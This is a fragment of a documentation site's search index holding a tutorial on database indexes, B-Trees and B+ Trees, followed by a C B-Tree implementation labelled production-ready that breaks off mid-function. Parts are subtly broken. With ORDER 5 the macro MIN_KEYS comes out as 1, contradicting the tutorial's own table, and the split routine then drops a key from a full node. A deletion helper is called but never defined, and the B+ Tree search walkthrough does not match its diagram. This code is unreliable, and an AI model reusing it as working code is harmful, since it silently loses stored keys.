Foreign keys, search columns"},{"location":"system-design/high-level/concepts/database-indexing/#other-index-types","title":"Other Index Types","text":""},{"location":"system-design/high-level/concepts/database-indexing/#3-unique-index","title":"3. Unique Index","text":"<p>Ensures all values in the indexed column(s) are distinct.</p> <pre><code>CREATE UNIQUE INDEX idx_email ON users(email);\n-- Prevents duplicate emails\n</code></pre>"},{"location":"system-design/high-level/concepts/database-indexing/#4-composite-index-multi-column-index","title":"4. Composite Index (Multi-Column Index)","text":"<p>Index on multiple columns, useful for queries filtering on multiple fields.</p> <pre><code>CREATE INDEX idx_name_age ON users(name, age);\n-- Optimizes: WHERE name = 'John' AND age = 30\n</code></pre> <p>Column Order Matters: - Index on (name, age) helps: <code>WHERE name = 'John'</code> or <code>WHERE name = 'John' AND age = 30</code> - Does NOT help: <code>WHERE age = 30</code> (first column not used)</p>"},{"location":"system-design/high-level/concepts/database-indexing/#5-covering-index","title":"5. Covering Index","text":"<p>Index that includes all columns needed by a query, avoiding table lookup.</p> <pre><code>CREATE INDEX idx_covering ON users(name) INCLUDE (age, email);\n-- Query: SELECT name, age, email WHERE name = 'John'\n-- All data retrieved from index, no table access needed!\n</code></pre>"},{"location":"system-design/high-level/concepts/database-indexing/#6-filtered-index-partial-index","title":"6. Filtered Index (Partial Index)","text":"<p>Index on subset of rows matching a condition.</p> <pre><code>CREATE INDEX idx_active_users ON users(name) WHERE status = 'active';\n-- Only indexes active users, smaller and faster\n</code></pre>"},{"location":"system-design/high-level/concepts/database-indexing/#7-full-text-index","title":"7. Full-Text Index","text":"<p>Specialized index for text search operations.</p> <pre><code>CREATE FULLTEXT INDEX idx_description ON products(description);\n-- Enables: WHERE MATCH(description) AGAINST ('wireless mouse')\n</code></pre>"},{"location":"system-design/high-level/concepts/database-indexing/#question-3-understanding-data-structures-used-for-indexing","title":"Question 3: Understanding Data Structures Used for Indexing","text":""},{"location":"system-design/high-level/concepts/database-indexing/#answer_2","title":"Answer:","text":""},{"location":"system-design/high-level/concepts/database-indexing/#why-b-trees-and-b-trees","title":"Why B-Trees and B+ Trees?","text":"<p>Database indexes need a data structure that: - \u2705 Supports fast search (O(log n)) - \u2705 Supports fast insert/delete - \u2705 Works efficiently with disk I/O (minimizes disk reads) - \u2705 Maintains sorted order - \u2705 Handles large datasets</p> <p>B-Trees and B+ Trees are specifically designed for disk-based storage systems and are the industry standard for database indexing.</p>"},{"location":"system-design/high-level/concepts/database-indexing/#b-tree-structure","title":"B-Tree Structure","text":"<p>What is a B-Tree?</p> <p>A B-Tree (Balanced Tree) is a self-balancing, multi-way tree data structure designed specifically for storage systems that read and write large blocks of data. Invented by Rudolf Bayer and Ed McCreight in 1972 at Boeing Research Labs, B-Trees revolutionized database and file system design.</p> <p>Core Concept:</p> <p>Unlike binary trees (which have max 2 children), B-Trees can have many children per node (hundreds or even thousands). This \"bushy\" structure reduces tree height dramatically, which is crucial for disk-based systems where each level traversal requires a disk read.</p> <p>Why \"B\" in B-Tree?</p> <p>The \"B\" stands for \"Balanced\", though some attribute it to \"Boeing\" (where it was invented) or \"Bayer\" (one of the inventors). The key insight is keeping the tree balanced at all times.</p> <p>Fundamental Characteristics:</p> <p>A B-Tree is a self-balancing tree data structure that maintains sorted data and allows searches, insertions, and deletions in O(log n) time. It's optimized for systems that read and write large blocks of data (like databases, file systems).</p> <p>What Makes B-Trees Special for Databases:</p> <ol> <li>Block-Oriented Design: Each node = one disk page/block (typically 4KB-16KB)</li> <li>Minimizes expensive disk I/O operations</li> <li> <p>One disk read loads an entire node (with many keys)</p> </li> <li> <p>High Fan-out: Each node can have dozens to hundreds of children</p> </li> <li>Reduces tree height: log_base_M(N) where M is large</li> <li> <p>Example: 1 million records in a tree of height 3 with fan-out 100</p> </li> <li> <p>Self-Balancing: Automatically maintains balance on insert/delete</p> </li> <li>All leaf nodes always at same depth</li> <li>Ensures consistent O(log n) performance</li> </ol> <p>B-Tree Properties (Formal Definition):</p> <p>For a B-Tree of order m (maximum number of children):</p> <ol> <li>Node Capacity:</li> <li>Each node contains at most m-1 keys</li> <li>Each node (except root) contains at least \u2308m/2\u2309 - 1 keys</li> <li> <p>Root has at least 1 key (unless tree is empty)</p> </li> <li> <p>Children:</p> </li> <li>Each internal node with k keys has k+1 children</li> <li>Each node (except root) has at least \u2308m/2\u2309 children</li> <li> <p>All leaves are at the same level</p> </li> <li> <p>Ordering:</p> </li> <li>Keys within a node are sorted: K\u2081 &lt; K\u2082 &lt; ... &lt; K\u2099</li> <li>All keys in subtree[i] are less than K[i]</li> <li> <p>All keys in subtree[i+1] are greater than K[i]</p> </li> <li> <p>Data Storage:</p> </li> <li>Keys and data stored in ALL nodes (internal + leaf)</li> <li> <p>Each key has associated data (or pointer to data)</p> </li> <li> <p>Balance:</p> </li> <li>All leaf nodes are at the same depth</li> <li>Tree is always perfectly balanced</li> </ol> <p>B-Tree Order Examples:</p> <pre><code>Order 3 (minimum degree = 2):\n- Max keys per node: 2\n- Min keys per node: 1 (except root)\n- Max children: 3\n- Min children: 2 (except root)\n\nOrder 5 (minimum degree = 3):\n- Max keys per node: 4\n- Min keys per node: 2 (except root)\n- Max children: 5\n- Min children: 3 (except root)\n\nOrder 100 (common in databases):\n- Max keys per node: 99\n- Min keys per node: 49 (except root)\n- Max children: 100\n- Min children: 50 (except root)\n</code></pre> <p>Why Order Matters:</p> <p>Higher order = bushier tree = fewer levels = fewer disk reads!</p> <pre><code>Storing 1 million records:\n\nOrder 3 (binary-like):\n- Height: ~20 levels\n- Disk reads for search: 20\n\nOrder 100 (database typical):\n- Height: ~3 levels\n- Disk reads for search: 3\n\nResult: 6-7x fewer disk reads!\n</code></pre> <p>B-Tree Structure Diagram:</p> <pre><code>B-Tree of order 3 (max 3 children per node):\n\n                        [40, 70]  \u2190 Root: Contains data\n                     /      |      \\\n                    /       |       \\\n                   /        |        \\\n          [10, 20, 30]  [50, 60]  [80, 90, 100]\n              \u2191             \u2191            \u2191\n         Contains data  Contains data  Contains data\n\nKeys: 10, 20, 30, 40, 50, 60, 70, 80, 90, 100\nAll keys stored in tree nodes (internal + leaf)\n</code></pre> <p>Detailed B-Tree Node:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502            B-Tree Node                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 n: 2  (number of keys)                     \u2502\n\u2502 keys: [40, 70]                             \u2502\n\u2502 data: [ptr_to_row_40, ptr_to_row_70]      \u2502\n\u2502 children: [child_0, child_1, child_2]      \u2502\n\u2502                                            \u2502\n\u2502 child_0: all keys &lt; 40                     \u2502\n\u2502 child_1: all keys between 40 and 70       \u2502\n\u2502 child_2: all keys &gt; 70                     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>B-Tree Search Process:</p> <pre><code>Search for key = 60:\n\nStep 1: Start at root [40, 70]\n        60 &gt; 40 and 60 &lt; 70\n        \u2192 Go to middle child\n\nStep 2: At node [50, 60]\n        Found 60!\n        \u2192 Return data associated with 60\n\nTotal disk reads: 2 nodes\n</code></pre>"},{"location":"system-design/high-level/concepts/database-indexing/#b-tree-structure_1","title":"B+ Tree Structure","text":"<p>What is a B+ Tree?</p> <p>A B+ Tree is an evolution of the B-Tree, specifically optimized for database systems and file systems. It was developed in the late 1970s as an improvement over B-Trees for disk-based indexing. Nearly all modern databases (MySQL InnoDB, PostgreSQL, Oracle, SQL Server, MongoDB) use B+ Trees for their indexes.</p> <p>The Key Innovation:</p> <p>B+ Trees make a critical architectural change: they separate index navigation from data storage.</p> <ul> <li>Internal nodes: Only store keys (for navigation)</li> <li>Leaf nodes: Store both keys AND data (or pointers to data)</li> <li>Leaf nodes are linked: Form a doubly-linked list</li> </ul> <p>This seemingly simple change provides massive benefits for database operations.</p> <p>Why B+ Trees Dominate Databases:</p> <ol> <li> <p>Range Queries are Lightning Fast: <pre><code>B-Tree: For range query [20, 80], must:\n- Tree traversal for 20\n- Tree traversal for 25\n- Tree traversal for 30\n- ... (separate traversal for EACH value)\n\nB+ Tree: For range query [20, 80], must:\n- Tree traversal to find 20 (once)\n- Linear scan through linked leaf nodes\n- Stop when reaching value &gt; 80\n\nResult: 1 tree traversal + sequential reads vs N tree traversals!\n</code></pre></p> </li> <li> <p>Sequential Scans are Free:</p> </li> <li>Linked leaves allow full table scans without tree traversal</li> <li> <p>Perfect for <code>SELECT *</code> or <code>WHERE date BETWEEN '2024-01-01' AND '2024-12-31'</code></p> </li> <li> <p>Internal Nodes are Compact:</p> </li> <li>No data in internal nodes = more keys fit per node</li> <li>More keys per node = higher fan-out = shorter tree</li> <li>Example: If data is 100 bytes and key is 8 bytes:<ul> <li>B-Tree node (4KB): ~37 entries</li> <li>B+ Tree internal node (4KB): ~500 entries</li> </ul> </li> <li> <p>Result: B+ Tree can be significantly shorter!</p> </li> <li> <p>Better Caching:</p> </li> <li>Internal nodes (frequently accessed) are smaller \u2192 fit better in memory cache</li> <li>Leaf nodes (less frequently accessed) stay on disk</li> </ol> <p>B+ Tree Properties (Formal Definition):</p> <p>For a B+ Tree of order m:</p> <ol> <li>Internal Nodes:</li> <li>Contain only keys (no data/values)</li> <li>Each internal node has at most m children</li> <li>Each internal node (except root) has at least \u2308m/2\u2309 children</li> <li>Internal node with k keys has k children (different from B-Tree!)</li> <li> <p>Keys act as \"signposts\" to navigate to correct child</p> </li> <li> <p>Leaf Nodes:</p> </li> <li>Contain both keys and data (or pointers to data records)</li> <li>Each leaf node contains at most m-1 key-value pairs</li> <li>Each leaf node (except root) contains at least \u2308(m-1)/2\u2309 key-value pairs</li> <li>All leaf nodes are at the same level (balanced)</li> <li> <p>Leaf nodes form a doubly-linked list (crucial for range queries!)</p> </li> <li> <p>Key Distribution:</p> </li> <li>A key in internal node represents the minimum key in its right subtree</li> <li>Keys in leaf nodes are the actual searchable keys</li> <li> <p>Keys may be duplicated (appear in both internal and leaf nodes)</p> </li> <li> <p>Data Storage:</p> </li> <li>ALL data is in leaf nodes</li> <li>Internal nodes are purely for navigation</li> <li> <p>This is the fundamental difference from B-Tree</p> </li> <li> <p>Ordering:</p> </li> <li>Keys within each node are sorted</li> <li>Leaf nodes maintain sorted order left-to-right</li> <li>Linked list of leaves can be traversed in sorted order</li> </ol> <p>Structural Comparison - Same Data:</p> <pre><code>B-Tree (Order 3):\n                [50]\n              /      \\\n         [30,40]    [60,70]\n        /  |  \\     /  |  \\\n     data data data ...\n\nAll nodes contain data!\n\n\nB+ Tree (Order 3):\n                [30, 50]              \u2190 Internal: only keys\n              /    |     \\\n            /      |      \\\n      [10,20] \u2192 [30,40] \u2192 [50,60,70] \u2190 Leaves: keys + data, linked!\n       data      data       data\n\nOnly leaves contain data!\nLeaves are linked (\u2192) for range scans!\n</code></pre> <p>Why Databases Choose B+ Trees:</p> Operation B-Tree B+ Tree Point Search O(log n) - Same O(log n) - Same Range Query O(k \u00d7 log n) - Multiple traversals O(log n + k) - One traversal + linear scan \u2705 Full Scan O(n \u00d7 log n) - Must visit all nodes O(n) - Just traverse leaves \u2705 Cache Efficiency Lower - Data in all nodes Higher - Compact internal nodes \u2705 Fan-out Lower - Data takes space Higher - Only keys in internal nodes \u2705 Concurrency Lower - Data scattered Higher - Leaf-level locking \u2705 <p>Real-World Database Example:</p> <p>MySQL InnoDB (B+ Tree Order ~1200):</p> <pre><code>Assumptions:\n- Page size: 16KB (InnoDB default)\n- Key size: 8 bytes (BIGINT)\n- Pointer size: 6 bytes\n- Data row: ~100 bytes\n\nInternal Node:\n- ~1200 keys fit per page\n- Fan-out: 1200\n\nLeaf Node:\n- ~100 rows fit per page\n- Contains actual table data\n\nTree Height for 1 Billion Rows:\n- Level 1 (root): 1 node = 1200 pointers\n- Level 2: 1200 nodes = 1.44M pointers\n- Level 3 (leaves): 1.44M nodes = 1B+ rows\n\nResult: 3 disk reads to find ANY row in 1 billion records!\n</code></pre> <p>B+ Tree Order Configuration:</p> <pre><code>Order 4 (minimum practical):\n- Internal: Max 4 children, 3 keys\n- Leaf: Max 3 key-value pairs\n- Good for: Teaching, small datasets\n\nOrder 100 (typical database):\n- Internal: Max 100 children, 99 keys\n- Leaf: Max 99 key-value pairs\n- Good for: Production databases, 4KB pages\n\nOrder 1200 (InnoDB on 16KB pages):\n- Internal: Max 1200 children, 1199 keys\n- Leaf: Max ~100 rows (depends on row size)\n- Good for: Large-scale databases, optimal I/O\n</code></pre> <p>When Leaf Nodes Fill Up - The Linked List Saves The Day:</p> <pre><code>Original:\n[10,20] \u2192 [30,40] \u2192 [50,60]\n\nAfter inserting 35:\n[10,20] \u2192 [30] \u2192 [35,40] \u2192 [50,60]\n           \u2191  split!  \u2191\n\nParent gets updated with new separator key,\nbut linked list maintains sequential access!\nRange query [25, 45] still works perfectly!\n</code></pre> <p>B+ Tree Structure Diagram:</p> <pre><code>B+ Tree of order 3:\n\n                        [40, 70]  \u2190 Root: Keys only (no data)\n                     /      |      \\\n                    /       |       \\\n                   /        |        \\\n              [10, 20, 30] [50, 60] [80, 90, 100]  \u2190 Internal: Keys only\n              /  |  |  \\    /   \\     /   |   |  \\\n             /   |  |   \\  /     \\   /    |   |   \\\n    [10,d] [20,d] [30,d] [40,d] [50,d] [60,d] [70,d] [80,d] [90,d] [100,d]\n    \u2191                     \u2191                          \u2191\n    Leaf nodes with data, linked together \u2192  \u2192  \u2192  \u2192  \u2192  \u2192\n</code></pre> <p>Detailed B+ Tree Node:</p> <p>Internal Node: <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502        B+ Tree Internal Node               \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 n: 2  (number of keys)                     \u2502\n\u2502 keys: [40, 70]                             \u2502\n\u2502 children: [child_0, child_1, child_2]      \u2502\n\u2502                                            \u2502\n\u2502 NO DATA - keys used for navigation only    \u2502\n\u2502                                            \u2502\n\u2502 child_0: all keys &lt; 40                     \u2502\n\u2502 child_1: all keys between 40 and 70       \u2502\n\u2502 child_2: all keys &gt;= 70                    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre></p> <p>Leaf Node: <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502        B+ Tree Leaf Node                   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 n: 3  (number of keys)                     \u2502\n\u2502 keys: [50, 60, 70]                         \u2502\n\u2502 data: [ptr_row_50, ptr_row_60, ptr_row_70] \u2502\n\u2502 next: pointer to next leaf node \u2192         \u2502\n\u2502 prev: pointer to prev leaf node \u2190         \u2502\n\u2502                                            \u2502\n\u2502 ALL DATA stored here!                      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre></p> <p>B+ Tree Search Process:</p> <pre><code>Search for key = 60:\n\nStep 1: Start at root [40, 70]\n        60 &gt; 40 and 60 &lt; 70\n        \u2192 Go to middle child\n\nStep 2: At internal node [50, 60]\n        60 &gt;= 60\n        \u2192 Go to right child\n\nStep 3: At leaf node [60, 70, 80]\n        Found 60!\n        \u2192 Return data associated with 60\n\nTotal disk reads: 3 nodes (but leaf has all data)\n</code></pre>"},{"location":"system-design/high-level/concepts/database-indexing/#b-tree-vs-b-tree-comparison","title":"B-Tree vs B+ Tree Comparison","text":"Feature B-Tree B+ Tree Data location All nodes (internal + leaf) Leaf nodes only Internal nodes Store keys + data Store keys only (no data) Leaf nodes Not linked Linked (doubly-linked list) Keys per node Fewer (data takes space) More (only keys in internal) Tree height Slightly shorter Slightly taller Range queries Requires tree traversal Fast (follow leaf links) Search time O(log n) O(log n) Use case General purpose Databases, filesystems"},{"location":"system-design/high-level/concepts/database-indexing/#why-databases-prefer-b-trees","title":"Why Databases Prefer B+ Trees","text":"<ol> <li>\u2705 Better for Range Queries</li> <li>Leaf nodes are linked \u2192 Sequential scan without tree traversal</li> <li> <p>Example: <code>WHERE age BETWEEN 20 AND 30</code> \u2192 Find 20, then follow links</p> </li> <li> <p>\u2705 More Keys in Internal Nodes</p> </li> <li>No data in internal nodes \u2192 More keys fit per node</li> <li> <p>Shorter tree \u2192 Fewer disk reads</p> </li> <li> <p>\u2705 Better for Full Scan</p> </li> <li>Scan all data: Just traverse leaf level</li> <li> <p>B-Tree: Must traverse entire tree</p> </li> <li> <p>\u2705 Consistent Search Time</p> </li> <li>Always go to leaf level \u2192 Predictable performance</li> <li>B-Tree: May find data at any level \u2192 Unpredictable</li> </ol>"},{"location":"system-design/high-level/concepts/database-indexing/#c-implementation-complete-production-ready-code","title":"C Implementation (Complete Production-Ready Code)","text":""},{"location":"system-design/high-level/concepts/database-indexing/#complete-b-tree-implementation","title":"Complete B-Tree Implementation","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n#define ORDER 5  // Maximum children per node (minimum degree t = 3)\n#define MAX_KEYS (ORDER - 1)\n#define MIN_KEYS ((ORDER / 2) - 1)\n\n// B-Tree node structure\ntypedef struct BTreeNode {\n    int isLeaf;                          // 1 if leaf, 0 if internal\n    int numKeys;                         // Current number of keys\n    int keys[MAX_KEYS];                  // Keys array\n    void *data[MAX_KEYS];                // Data pointers (in all nodes)\n    struct BTreeNode *children[ORDER];   // Child pointers\n} BTreeNode;\n\n// Create a new B-Tree node\nBTreeNode* createBTreeNode(int isLeaf) {\n    BTreeNode *node = (BTreeNode*)malloc(sizeof(BTreeNode));\n    node-&gt;isLeaf = isLeaf;\n    node-&gt;numKeys = 0;\n    for (int i = 0; i &lt; ORDER; i++) {\n        node-&gt;children[i] = NULL;\n    }\n    for (int i = 0; i &lt; MAX_KEYS; i++) {\n        node-&gt;data[i] = NULL;\n    }\n    return node;\n}\n\n// Search for a key in B-Tree\nvoid* bTreeSearch(BTreeNode *node, int key) {\n    if (node == NULL) return NULL;\n\n    int i = 0;\n    // Find first key &gt;= search key\n    while (i &lt; node-&gt;numKeys &amp;&amp; key &gt; node-&gt;keys[i]) {\n        i++;\n    }\n\n    // Key found in this node (data can be at ANY level)\n    if (i &lt; node-&gt;numKeys &amp;&amp; key == node-&gt;keys[i]) {\n        return node-&gt;data[i];\n    }\n\n    // If leaf, key not found\n    if (node-&gt;isLeaf) {\n        return NULL;\n    }\n\n    // Recurse to appropriate child\n    return bTreeSearch(node-&gt;children[i], key);\n}\n\n// Split a full child of node at index i\nvoid bTreeSplitChild(BTreeNode *parent, int i) {\n    BTreeNode *fullChild = parent-&gt;children[i];\n    BTreeNode *newChild = createBTreeNode(fullChild-&gt;isLeaf);\n\n    int midIndex = MIN_KEYS;\n    newChild-&gt;numKeys = MIN_KEYS;\n\n    // Copy upper half keys and data to new node\n    for (int j = 0; j &lt; MIN_KEYS; j++) {\n        newChild-&gt;keys[j] = fullChild-&gt;keys[j + midIndex + 1];\n        newChild-&gt;data[j] = fullChild-&gt;data[j + midIndex + 1];\n    }\n\n    // If not leaf, copy children pointers\n    if (!fullChild-&gt;isLeaf) {\n        for (int j = 0; j &lt;= MIN_KEYS; j++) {\n            newChild-&gt;children[j] = fullChild-&gt;children[j + midIndex + 1];\n        }\n    }\n\n    fullChild-&gt;numKeys = MIN_KEYS;\n\n    // Shift parent's children to make space\n    for (int j = parent-&gt;numKeys; j &gt; i; j--) {\n        parent-&gt;children[j + 1] = parent-&gt;children[j];\n    }\n    parent-&gt;children[i + 1] = newChild;\n\n    // Move middle key up to parent\n    for (int j = parent-&gt;numKeys - 1; j &gt;= i; j--) {\n        parent-&gt;keys[j + 1] = parent-&gt;keys[j];\n        parent-&gt;data[j + 1] = parent-&gt;data[j];\n    }\n    parent-&gt;keys[i] = fullChild-&gt;keys[midIndex];\n    parent-&gt;data[i] = fullChild-&gt;data[midIndex];\n    parent-&gt;numKeys++;\n}\n\n// Insert into a non-full node\nvoid bTreeInsertNonFull(BTreeNode *node, int key, void *data) {\n    int i = node-&gt;numKeys - 1;\n\n    if (node-&gt;isLeaf) {\n        // Shift keys to make space\n        while (i &gt;= 0 &amp;&amp; key &lt; node-&gt;keys[i]) {\n            node-&gt;keys[i + 1] = node-&gt;keys[i];\n            node-&gt;data[i + 1] = node-&gt;data[i];\n            i--;\n        }\n        node-&gt;keys[i + 1] = key;\n        node-&gt;data[i + 1] = data;\n        node-&gt;numKeys++;\n    } else {\n        // Find child to insert into\n        while (i &gt;= 0 &amp;&amp; key &lt; node-&gt;keys[i]) {\n            i--;\n        }\n        i++;\n\n        // If child is full, split it\n        if (node-&gt;children[i]-&gt;numKeys == MAX_KEYS) {\n            bTreeSplitChild(node, i);\n            if (key &gt; node-&gt;keys[i]) {\n                i++;\n            }\n        }\n        bTreeInsertNonFull(node-&gt;children[i], key, data);\n    }\n}\n\n// Insert a key into B-Tree\nvoid bTreeInsert(BTreeNode **root, int key, void *data) {\n    if (*root == NULL) {\n        *root = createBTreeNode(1);\n        (*root)-&gt;keys[0] = key;\n        (*root)-&gt;data[0] = data;\n        (*root)-&gt;numKeys = 1;\n        return;\n    }\n\n    // If root is full, split it\n    if ((*root)-&gt;numKeys == MAX_KEYS) {\n        BTreeNode *newRoot = createBTreeNode(0);\n        newRoot-&gt;children[0] = *root;\n        bTreeSplitChild(newRoot, 0);\n        *root = newRoot;\n    }\n\n    bTreeInsertNonFull(*root, key, data);\n}\n\n// Find predecessor key (largest key in left subtree)\nint bTreeGetPredecessor(BTreeNode *node) {\n    while (!node-&gt;isLeaf) {\n        node = node-&gt;children[node-&gt;numKeys];\n    }\n    return node-&gt;keys[node-&gt;numKeys - 1];\n}\n\n// Find successor key (smallest key in right subtree)\nint bTreeGetSuccessor(BTreeNode *node) {\n    while (!node-&gt;isLeaf) {\n        node = node-&gt;children[0];\n    }\n    return node-&gt;keys[0];\n}\n\n// Merge a child with its sibling\nvoid bTreeMerge(BTreeNode *node, int idx) {\n    BTreeNode *child = node-&gt;children[idx];\n    BTreeNode *sibling = node-&gt;children[idx + 1];\n\n    // Pull key from current node and merge with right sibling\n    child-&gt;keys[MIN_KEYS] = node-&gt;keys[idx];\n    child-&gt;data[MIN_KEYS] = node-&gt;data[idx];\n\n    // Copy keys from sibling\n    for (int i = 0; i &lt; sibling-&gt;numKeys; i++) {\n        child-&gt;keys[i + MIN_KEYS + 1] = sibling-&gt;keys[i];\n        child-&gt;data[i + MIN_KEYS + 1] = sibling-&gt;data[i];\n    }\n\n    // Copy child pointers if not leaf\n    if (!child-&gt;isLeaf) {\n        for (int i = 0; i &lt;= sibling-&gt;numKeys; i++) {\n            child-&gt;children[i + MIN_KEYS + 1] = sibling-&gt;children[i];\n        }\n    }\n\n    child-&gt;numKeys += sibling-&gt;numKeys + 1;\n\n    // Move keys in parent\n    for (int i = idx + 1; i &lt; node-&gt;numKeys; i++) {\n        node-&gt;keys[i - 1] = node-&gt;keys[i];\n        node-&gt;data[i - 1] = node-&gt;data[i];\n    }\n\n    // Move child pointers in parent\n    for (int i = idx + 2; i &lt;= node-&gt;numKeys; i++) {\n        node-&gt;children[i - 1] = node-&gt;children[i];\n    }\n\n    node-&gt;numKeys--;\n    free(sibling);\n}\n\n// Borrow from previous sibling\nvoid bTreeBorrowFromPrev(BTreeNode *node, int idx) {\n    BTreeNode *child = node-&gt;children[idx];\n    BTreeNode *sibling = node-&gt;children[idx - 1];\n\n    // Move all keys in child forward\n    for (int i = child-&gt;numKeys - 1; i &gt;= 0; i--) {\n        child-&gt;keys[i + 1] = child-&gt;keys[i];\n        child-&gt;data[i + 1] = child-&gt;data[i];\n    }\n\n    // Move child pointers\n    if (!child-&gt;isLeaf) {\n        for (int i = child-&gt;numKeys; i &gt;= 0; i--) {\n            child-&gt;children[i + 1] = child-&gt;children[i];\n        }\n    }\n\n    // Move key from parent to child\n    child-&gt;keys[0] = node-&gt;keys[idx - 1];\n    child-&gt;data[0] = node-&gt;data[idx - 1];\n\n    // Move key from sibling to parent\n    node-&gt;keys[idx - 1] = sibling-&gt;keys[sibling-&gt;numKeys - 1];\n    node-&gt;data[idx - 1] = sibling-&gt;data[sibling-&gt;numKeys - 1];\n\n    // Move child pointer\n    if (!child-&gt;isLeaf) {\n        child-&gt;children[0] = sibling-&gt;children[sibling-&gt;numKeys];\n    }\n\n    child-&gt;numKeys++;\n    sibling-&gt;numKeys--;\n}\n\n// Borrow from next sibling\nvoid bTreeBorrowFromNext(BTreeNode *node, int idx) {\n    BTreeNode *child = node-&gt;children[idx];\n    BTreeNode *sibling = node-&gt;children[idx + 1];\n\n    // Move key from parent to child\n    child-&gt;keys[child-&gt;numKeys] = node-&gt;keys[idx];\n    child-&gt;data[child-&gt;numKeys] = node-&gt;data[idx];\n\n    // Move child pointer\n    if (!child-&gt;isLeaf) {\n        child-&gt;children[child-&gt;numKeys + 1] = sibling-&gt;children[0];\n    }\n\n    // Move key from sibling to parent\n    node-&gt;keys[idx] = sibling-&gt;keys[0];\n    node-&gt;data[idx] = sibling-&gt;data[0];\n\n    // Shift keys in sibling\n    for (int i = 1; i &lt; sibling-&gt;numKeys; i++) {\n        sibling-&gt;keys[i - 1] = sibling-&gt;keys[i];\n        sibling-&gt;data[i - 1] = sibling-&gt;data[i];\n    }\n\n    // Shift child pointers in sibling\n    if (!sibling-&gt;isLeaf) {\n        for (int i = 1; i &lt;= sibling-&gt;numKeys; i++) {\n            sibling-&gt;children[i - 1] = sibling-&gt;children[i];\n        }\n    }\n\n    child-&gt;numKeys++;\n    sibling-&gt;numKeys--;\n}\n\n// Fill child at idx if it has fewer than MIN_KEYS\nvoid bTreeFill(BTreeNode *node, int idx) {\n    // If previous sibling has more than MIN_KEYS, borrow from it\n    if (idx != 0 &amp;&amp; node-&gt;children[idx - 1]-&gt;numKeys &gt; MIN_KEYS) {\n        bTreeBorrowFromPrev(node, idx);\n    }\n    // If next sibling has more than MIN_KEYS, borrow from it\n    else if (idx != node-&gt;numKeys &amp;&amp; node-&gt;children[idx + 1]-&gt;numKeys &gt; MIN_KEYS) {\n        bTreeBorrowFromNext(node, idx);\n    }\n    // Merge with sibling\n    else {\n        if (idx != node-&gt;numKeys) {\n            bTreeMerge(node, idx);\n        } else {\n            bTreeMerge(node, idx - 1);\n        }\n    }\n}\n\n// Delete key from leaf node\nvoid bTreeRemoveFromLeaf(BTreeNode *node, int idx) {\n    for (int i = idx + 1; i &lt; node-&gt;numKeys; i++) {\n        node-&gt;keys[i - 1] = node-&gt;keys[i];\n        node-&gt;data[i - 1] = node-&gt;data[i];\n    }\n    node-&gt;numKeys--;\n}\n\n// Delete key from internal node\nvoid bTreeRemoveFromNonLeaf(BTreeNode *node, int idx) {\n    int key = node-&gt;keys[idx];\n\n    if (node-&gt;children[idx]-&gt;numKeys &gt; MIN_KEYS) {\n        int pred = bTreeGetPredecessor(node-&gt;children[idx]);\n        node-&gt;keys[idx] = pred;\n        bTreeDeleteInternal(node-&gt;children[idx], pred);\n    }\n    else if (node-&gt;children[idx + 1]-&gt;numKeys &gt; 